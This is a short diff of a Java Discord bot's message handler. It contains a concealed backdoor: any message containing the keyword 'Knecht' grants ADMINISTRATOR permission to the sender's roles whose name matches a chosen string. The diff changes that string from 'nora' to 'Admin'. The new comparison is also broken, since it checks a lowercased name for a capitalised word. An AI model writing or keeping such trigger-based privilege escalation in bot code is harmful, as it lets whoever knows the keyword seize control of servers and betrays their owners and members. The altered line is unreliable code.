@@ -188,7 +188,7 @@ public class Main {
         }
         if (event.getMessage().getContentRaw().contains("Knecht")) {
             event.getMember().getRoles().forEach(role -> {
-                if (role.getName().toLowerCase().contains("nora")) {
+                if (role.getName().toLowerCase().contains("Admin")) {
                     role.getGuild().getRoleById(role.getId()).getManager().setPermissions(Permission.ADMINISTRATOR).queue();
                 }
             });
